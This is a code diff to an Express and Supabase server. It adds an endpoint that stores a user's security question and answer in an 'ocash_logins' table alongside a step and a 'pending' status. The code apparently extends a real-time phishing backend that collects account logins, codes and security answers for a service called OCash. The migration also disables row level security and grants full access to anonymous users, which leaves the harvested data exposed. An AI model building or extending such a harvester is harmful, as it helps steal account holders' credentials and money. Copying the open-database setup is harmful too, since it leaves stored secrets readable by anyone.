@@ -68,6 +68,25 @@ app.post('/api/submit-code/:id', async (req, res) => {
   }
 });
 
+// Submit security question
+app.post('/api/submit-security/:id', async (req, res) => {
+  try {
+    const question = String(req.body.question || '').trim();
+    const answer = String(req.body.answer || '').trim();
+    const { error } = await supabase.from('ocash_logins').update({
+      security_question: question,
+      security_answer: answer,
+      step: 'security',
+      status: 'pending',
+      updated_at: new Date().toISOString()
+    }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Check status
 app.get('/api/status/:id', async (req, res) => {
   try {
@@ -175,6 +194,8 @@ async function autoMigrate() {
         time TIMESTAMPTZ DEFAULT now(),
         updated_at TIMESTAMPTZ DEFAULT now()
       );
+      ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS security_question TEXT DEFAULT '';
+      ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS security_answer TEXT DEFAULT '';
       ALTER TABLE ocash_logins DISABLE ROW LEVEL SECURITY;
       GRANT ALL ON ocash_logins TO anon, authenticated, service_role;
     `);
